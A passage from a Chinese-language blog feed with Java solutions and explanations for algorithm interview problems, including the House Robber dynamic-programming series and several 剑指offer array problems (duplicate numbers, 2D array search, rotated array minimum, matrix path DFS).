class="hljs-number">0</span>, dp_i_2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> dp_i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = end; i &gt;= start; i--) &#123;<br>        dp_i = Math.max(dp_i_1, nums[i] + dp_i_2);<br>        dp_i_2 = dp_i_1;<br>        dp_i_1 = dp_i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp_i;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，第二问也解决了。</p><p><strong>House Robber III</strong></p><p>第三题又想法设法地变花样了，此强盗发现现在面对的房子不是一排，不是一圈，而是一棵二叉树！房子在二叉树的节点上，相连的两个房子不能同时被抢劫：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/IMG_0143.PNG" alt="IMG_0143" style="zoom: 67%;" /></p><p>整体的思路完全没变，还是做抢或者不抢的选择，取收益较大的选择。甚至我们可以直接按这个套路写出代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;TreeNode, Integer&gt; memo = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 利用备忘录消除重叠子问题</span><br>    <span class="hljs-keyword">if</span> (memo.containsKey(root)) <br>        <span class="hljs-keyword">return</span> memo.get(root);<br>    <span class="hljs-comment">// 抢，然后去下下家</span><br>    <span class="hljs-keyword">int</span> do_it = root.val<br>        + (root.left == <span class="hljs-keyword">null</span> ? <br>            <span class="hljs-number">0</span> : rob(root.left.left) + rob(root.left.right))<br>        + (root.right == <span class="hljs-keyword">null</span> ? <br>            <span class="hljs-number">0</span> : rob(root.right.left) + rob(root.right.right));<br>    <span class="hljs-comment">// 不抢，然后去下家</span><br>    <span class="hljs-keyword">int</span> not_do = rob(root.left) + rob(root.right);<br><br>    <span class="hljs-keyword">int</span> res = Math.max(do_it, not_do);<br>    memo.put(root, res);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题就解决了，时间复杂度 O(N)，N为数的节点数。</p><p>但是这道题让我觉得巧妙的点在于，还有更漂亮的解法。比如下面是我在评论区看到的一个解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span>[] res = dp(root);<br>    <span class="hljs-keyword">return</span> Math.max(res[<span class="hljs-number">0</span>], res[<span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-comment">/* 返回一个大小为 2 的数组 arr</span><br><span class="hljs-comment">arr[0] 表示不抢 root 的话，得到的最大钱数</span><br><span class="hljs-comment">arr[1] 表示抢 root 的话，得到的最大钱数 */</span><br><span class="hljs-keyword">int</span>[] dp(TreeNode root) &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">int</span>[] left = dp(root.left);<br>    <span class="hljs-keyword">int</span>[] right = dp(root.right);<br>    <span class="hljs-comment">// 抢，下家就不能抢了</span><br>    <span class="hljs-keyword">int</span> rob = root.val + left[<span class="hljs-number">0</span>] + right[<span class="hljs-number">0</span>];<br>    <span class="hljs-comment">// 不抢，下家可抢可不抢，取决于收益大小</span><br>    <span class="hljs-keyword">int</span> not_rob = Math.max(left[<span class="hljs-number">0</span>], left[<span class="hljs-number">1</span>])<br>                + Math.max(right[<span class="hljs-number">0</span>], right[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;not_rob, rob&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>时间复杂度 O(N)，空间复杂度只有递归函数堆栈所需的空间，不需要备忘录的额外空间。</p><p>你看他和我们的思路不一样，修改了递归函数的定义，略微修改了思路，使得逻辑自洽，依然得到了正确的答案，而且代码更漂亮。这就是我们前文 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484469&amp;idx=1&amp;sn=e8d321c8ad62483874a997e9dd72da8f&amp;chksm=9bd7fa3daca0732b316aa0afa58e70357e1cb7ab1fe0855d06bc4a852abb1b434c01c7dd19d6&amp;scene=21#wechat_redirect">动态规划：不同的定义产生不同的解法</a> 所说过的动态规划问题的一个特性。</p><p>实际上，这个解法比我们的解法运行时间要快得多，虽然算法分析层面时间复杂度是相同的。原因在于此解法没有使用额外的备忘录，减少了数据操作的复杂性，所以实际运行效率会快。</p>]]></content>
    
    
    <summary type="html">动态规划笔记</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="动态规划" scheme="http://example.com/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>剑指offer</title>
    <link href="http://example.com/2021/02/06/%E5%89%91%E6%8C%87offer/"/>
    <id>http://example.com/2021/02/06/%E5%89%91%E6%8C%87offer/</id>
    <published>2021-02-06T11:53:38.000Z</published>
    <updated>2021-03-11T11:50:37.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-数组"><a href="#1-数组" class="headerlink" title="1. 数组"></a>1. 数组</h1><h2 id="1-1-数组中重复的数字"><a href="#1-1-数组中重复的数字" class="headerlink" title="1.1 数组中重复的数字"></a>1.1 数组中重复的数字</h2><p>题目：找出数组中重复的数字。</p><p>​    在一个长度为 n 的数组 nums 里的所有数字都在 0～n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。请找出数组中任意一个重复的数字。</p><p>​    简单的方法是嵌套循环，但是没有利用题目给出的特殊条件。</p><p>​    题目的特殊条件是所有数都在0~n-1范围</p><p>​    方法一：利用集合的不可重复性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findRepeatNumber1</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-comment">//利用集合特性</span><br>    HashSet hashSet1 = <span class="hljs-keyword">new</span> HashSet&lt;String&gt;();<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> length = nums.length;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;i&lt;length;i++)&#123;<br>        <span class="hljs-keyword">if</span> (hashSet1.add(nums[i]) == <span class="hljs-keyword">true</span>)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> nums[i];<br><br>&#125;<br></code></pre></td></tr></table></figure><p>​    方法二：利用下标特性</p><p>​    所有数都在0~n-1范围，假设数组中没有重复的数字，那么排序后索引i处存储数字为i，不为i则必存在重复数字。同一位置只能存放一个合适的值，若有重复的数字则必发生交换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findRepeatNumber2</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>      <span class="hljs-keyword">int</span> temp;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.length;i++)&#123;<br>            <span class="hljs-keyword">while</span> (nums[i]!=i)&#123;<br>                <span class="hljs-keyword">if</span>(nums[i]==nums[nums[i]])&#123;<br>                    <span class="hljs-keyword">return</span> nums[i];<br>                &#125;<br>                temp=nums[i];<br>                nums[i]=nums[temp];<br>                nums[temp]=temp;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-二维数组中的查找"><a href="#1-2-二维数组中的查找" class="headerlink" title="1.2 二维数组中的查找"></a>1.2 二维数组中的查找</h2><p>题目：在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><p>方法一：暴力破解</p><p>​    直接遍历二维数组查找，但这样做不够巧妙</p><p>方法二：剑指offer解法</p><p>​    利用该二维数组的性质：</p><ul><li>每一行从左到右递增</li><li>每一列从上到下递增</li></ul><p>使用右上角的值m和目标值target比较：</p><ol><li>当 m &lt; target，由于 m 已经是该行最大的元素，想要更大只有从下面的行，取值下移一位</li><li>当 m &gt; target，由于 m 已经是该列最小的元素，想要更小只有从左边的列，取值左移一位</li><li>当 m = target，找到该值，返回 true</li></ol><p>用某行最小或某列最大与 target 比较，每次可剔除一整行或一整列</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JZ1</span> </span>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 在一个二维数组中（每个一维数组的长度相同），每一行都按照从</span><br><span class="hljs-comment">    * 左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。</span><br><span class="hljs-comment">    * 请完成一个函数，输入这样的一个二维数组和一个整数，</span><br><span class="hljs-comment">    * 判断数组中是否含有该整数。</span><br><span class="hljs-comment">    * */</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> [][] array = &#123;&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;,&#123;<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>&#125;,&#123;<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>&#125;,&#123;<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>&#125;&#125;;<br>        Boolean flag = Find2(<span class="hljs-number">0</span>,array);<br>        System.out.println(flag);<br>    &#125;<br><br>    <span class="hljs-comment">//自己解法，暴力破解（无技术含量）</span><br><br>    <span class="hljs-comment">//官方解法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">Find2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> target, <span class="hljs-keyword">int</span>[][] array)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> column = array[<span class="hljs-number">0</span>].length-<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">int</span> rows = array.length-<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (column&lt;<span class="hljs-number">0</span>||rows&lt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">int</span> row = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">if</span> (target==array[row][column])&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target&lt;array[row][column])&#123;<br>                column--;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target&gt;array[row][column])&#123;<br>                row++;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">while</span> (!(row&gt;rows||column&lt;<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-3-旋转数组中的最小数字"><a href="#1-3-旋转数组中的最小数字" class="headerlink" title="1.3 旋转数组中的最小数字"></a>1.3 旋转数组中的最小数字</h2><p>​    题目：把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。<br>​    输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。例如数组{3,4,5,1,2}为{1,2,3,4,5}的一个旋转，该数组的最小值为1。<br>​    NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。</p><ol><li>简单的方法是直接遍历，但这样没有只有旋转数组的特性。这样时间复杂度为$O(n)$</li><li>旋转数组的特性是什么？</li></ol><p>​    注意到数组旋转前是按关键字有序排列的，也就是说旋转数组在一定程度上是有序的，这很符合二分查找的特性，那么旋转后的数组可不可以使用二分查找呢？或许可以通过适当的改变二分查找解决</p><p>​    旋转数组可以划分为两个排序的子数组，前面的子数组元素都大于或等于后面数组的元素，最小的元素刚好是这两个数组的分界线。</p><p>一个包含重复元素的升序数组在经过旋转之后，可以得到下面可视化的折线图：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/1.png" alt="fig1" style="zoom: 33%;" /></p><p>​    其中横轴表示数组元素的下标，纵轴表示数组元素的值。图中标出了最小值的位置，是我们需要旋转的目标。</p><p>​    我们考虑数组中的最后一个元素 x：在最小值右侧的元素，它们的值一定都小于等于 x；而在最小值左侧的元素，它们的值一定都大于等于 x。因此，我们可以根据这一条性质，通过二分查找的方法找出最小值。</p><p>​    在二分查找的每一步中，左边界为 $\it low$，右边界为 $\it high$，区间的中点为$ \it pivot$，最小值就在该区间内。我们将中轴元素 $\textit{numbers}[\textit{pivot}]$ 与右边界元素 $\textit{numbers}[\textit{high}]$进行比较，可能会有以下的三种情况：</p><p>​    第一种情况是$ \textit{numbers}[\textit{pivot}] &lt; \textit{numbers}[\textit{high}]$。如下图所示，这说明 $\textit{numbers}[\textit{pivot}]$ 是最小值右侧的元素，因此我们可以忽略二分查找区间的右半部分。</p><p><img src="https://assets.leetcode-cn.com/solution-static/jianzhi_11/2.png" alt="fig2" style="zoom:33%;" /></p><p>​    </p><p>第二种情况是$ \textit{numbers}[\textit{pivot}]$ &gt; $\textit{numbers}[\textit{high}]$。如下图所示，这说明 $\textit{numbers}[\textit{pivot}]$ 是最小值左侧的元素，因此我们可以忽略二分查找区间的左半部分。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3.png" alt="fig3" style="zoom:33%;" /></p><p>第三种情况是$ \textit{numbers}[\textit{pivot}]$ == $\textit{numbers}[\textit{high}]$。如下图所示，由于重复元素的存在，我们并不能确定 $\textit{numbers}[\textit{pivot}]$ 究竟在最小值的左侧还是右侧，因此我们不能莽撞地忽略某一部分的元素。我们唯一可以知道的是，由于它们的值相同，所以无论$ \textit{numbers}[\textit{high}]$ 是不是最小值，都有一个它的「替代品」$\textit{numbers}[\textit{pivot}]$，因此我们可以忽略二分查找区间的右端点。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/4.png" alt="fig4" style="zoom:33%;" /></p><p>补充思考： 为什么本题二分法不用$ nums[m]$ 和$ nums[i]$ 作比较？</p><p>二分目的是判断<font color='red'> m 在哪个排序数组中</font>，从而缩小区间。而在 $nums[m]&gt;nums[i]$情况下，无法判断 m 在哪个排序数组中。本质上是由于 j 初始值肯定在右排序数组中； i 初始值无法确定在哪个排序数组中。举例如下：</p><p>对于以下两示例，当 i = 0, j = 4, m = 2 时，有$ nums[m] &gt; nums[i] $，而结果不同。<br>[1,2,3,4,5] 旋转点 x = 0： m 在右排序数组（此示例只有右排序数组）；<br>[3,4,5,1,2]旋转点 x = 3 ： m 在左排序数组。</p><p>排序数组的查找问题首先考虑使用 <strong>二分法</strong> 解决，其可将 <strong>遍历法</strong> 的 <strong>线性级别</strong> 时间复杂度降低至 <strong>对数级别</strong> 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">minArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] numbers)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (numbers.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = numbers.length - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &lt; j) &#123;<br>            <span class="hljs-keyword">int</span> m = i + (j - i) / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span> (numbers[m] &gt; numbers[j]) &#123;<br>                i = m + <span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (numbers[m] &lt; numbers[j]) &#123;<br>                j = m;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">int</span> x = i;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k = i + <span class="hljs-number">1</span>; k &lt; j; k++) &#123;<br>                    <span class="hljs-keyword">if</span>(numbers[k] &lt; numbers[x])&#123;<br>                        x = k;<br>                    &#125; <br>                &#125;<br>                <span class="hljs-keyword">return</span> numbers[x];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> numbers[i];<br>    &#125;<br></code></pre></td></tr></table></figure><p>二分查找中还涉及了一个知识点：</p><p>计算$mid = low+(high-low)/2$，为什么不使用$mid=(low+high)/2$呢。</p><p>​    首先第一种写法与第二种数学上得到的结果是完全一样的，这个可以通过取整函数的方法证明。但是low＋high这一步操作很可能会出现整数溢出的风险，而 low + (end-low)/2 写法不会出现比high要大的中间数据，所以比较安全。如果你是用 python 这种自带大数支持的语言，就不用担心这种写法会整数溢出了。除此之外如果low和high是指针或者迭代器的话是无法编译通过的，因为指针和迭代器运算不支持相加运算，却支持相减运算，所以第一种通用性强。</p><h2 id="1-4-矩阵中的路径"><a href="#1-4-矩阵中的路径" class="headerlink" title="1.4 矩阵中的路径"></a>1.4 矩阵中的路径</h2><p>题目：请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一格开始，每一步可以在矩阵中向左、右、上、下移动一格。如果一条路径经过了矩阵的某一格，那么该路径不能再次进入该格子。例如，在下面的3×4的矩阵中包含一条字符串“bfce”的路径（路径中的字母用加粗标出）。</p><p>[[“a”,”b”,”c”,”e”],<br>[“s”,”f”,”c”,”s”],<br>[“a”,”d”,”e”,”e”]]</p><p>​    但矩阵中不包含字符串“abfb”的路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入这个格子。</p><p>​    矩阵搜索问题，求连通块应该使用深度优先搜索（DFS）+剪枝解决。</p><p><strong>原理</strong></p><ul><li><p>深度优先搜索： 可以理解为暴力法遍历矩阵中所有字符串可能性。DFS 通过递归，先朝一个方向搜到底，再回溯至上个节点，沿另一个方向搜索，以此类推。</p></li><li><p>剪枝： 在搜索中，遇到这条路不可能和目标字符串匹配成功的情况（例如：此矩阵元素和目标字符不同、此元素已被访问），则应立即返回，称之为 可行性剪枝 。</p></li></ul><p><strong>分析</strong></p><ul><li>递归参数： 当前元素在矩阵 board 中的行列索引 i 和 j ，当前目标字符在 word 中的索引 k 。</li><li>终止条件：<ul><li>返回 false ： ① 行或列索引越界 或 ② 当前矩阵元素与目标字符不同 或 ③ 当前矩阵元素已访问过 （③ 可合并至 ② ） 。</li><li>返回 true ： 字符串 word 已全部匹配，即 k = len(word) - 1 。</li></ul></li><li>递推工作：<ul><li>标记当前矩阵元素： 将 board[i][j] 值暂存于变量 tmp ，并修改为字符 ‘/‘ ，代表此元素已访问过，防止之后搜索时重复访问。</li><li>搜索下一单元格： 朝当前元素的 上、下、左、右 四个方向开启下层递归，使用 或 连接 （代表只需一条可行路径） ，并记录结果至 res 。</li><li>还原当前矩阵元素： 将 tmp 暂存值还原至 board[i][j]元素。</li></ul></li><li>回溯返回值： 返回 res ，代表是否搜索到目标字符串。</li></ul><p><strong>复杂度分析</strong></p><blockquote><p> M,N 分别为矩阵行列大小， KK 为字符串 word 长度。</p></blockquote><ul><li>时间复杂度 O(3<sup>K</sup>MN)，最差情况下，需要遍历矩阵中长度为 KK 字符串的所有方案，时间复杂度为 O(3<sup>k</sup>)；矩阵中共有 MN个起点，时间复杂度为 O(MN) 。<ul><li>方案数计算： 设字符串长度为 K ，搜索中每个字符有上、下、左、右四个方向可以选择，舍弃回头（上个字符）的方向，剩下 3 种选择，因此方案数的复杂度为 O(3<sup>k</sup>) 。</li><li>空间复杂度 O(K) ： 搜索过程中的递归深度不超过 K ，因此系统因函数调用累计使用的栈空间占用 O(K)（因为函数返回后，系统调用的栈空间会释放）。最坏情况下 K = MN ，递归深度为 MN ，此时系统栈使用 O(MN) 的额外空间。</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">exist</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] board, String word)</span> </span>&#123;<br>    <span class="hljs-keyword">char</span>[] words = word.toCharArray();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;board.length;i++ )&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;j&lt;board[<span class="hljs-number">0</span>].length;j++)&#123;<br>            <span class="hljs-keyword">if</span> (dfs(board,words,i,j,<span class="hljs-number">0</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] board,<span class="hljs-keyword">char</span>[] word,<span class="hljs-keyword">int</span> i,<span class="hljs-keyword">int</span> j,<span class="hljs-keyword">int</span> k)</span></span>&#123;<br>    <span class="hljs-comment">//排除不合法选择</span><br>    <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || i&gt;= board.length || j &lt; <span class="hljs-number">0</span> || j&gt;= board[<span class="hljs-number">0</span>].length || board[i][j] != word[k])&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//触发结束条件</span><br>    <span class="hljs-keyword">if</span> (k == word.length-<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">char</span> tmp = board[i][j];<br>    <span class="hljs-comment">//将该选择从选择列表移除</span><br>    board[i][j] = <span class="hljs-string">&#x27;/&#x27;</span>;<br>    <span class="hljs-comment">//路径.add(选择)</span><br>    <span class="hljs-keyword">boolean</span> res = dfs(board,word,i+<span class="hljs-number">1</span>,j,k+<span class="hljs-number">1</span>) || dfs(board,word,i-<span class="hljs-number">1</span>,j,k+<span class="hljs-number">1</span>) ||<br>                  dfs(board,word,i,j+<span class="hljs-number">1</span>,k+<span class="hljs-number">1</span>) || dfs(board,word,i,j-<span class="hljs-number">1</span>,k+<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//撤销选择</span><br>    board[i][j] = tmp;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-5-调整数组顺序使奇数位于偶数前面"><a href="#1-5-调整数组顺序使奇数位于偶数前面" class="headerlink" title="1.5 调整数组顺序使奇数位于偶数前面"></a>1.5 调整数组顺序使奇数位于偶数前面</h2><p>题目：输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分。</p><p>​    调整数组的顺序，显然这是排序题。首先简单的想法是遇到从前向后遍历，遇到奇数放在数组1，遇到偶数放在数组2，最后将数组1和数组2拼接。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reOrderArray1</span><span class="hljs-params">(<span class="hljs-keyword">int</span> [] array)</span> </span>&#123;<br>    ArrayList array1 = <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;();<br>    ArrayList array2 = <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;();<br>    <span class="hljs-keyword">int</span> length = array.length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span 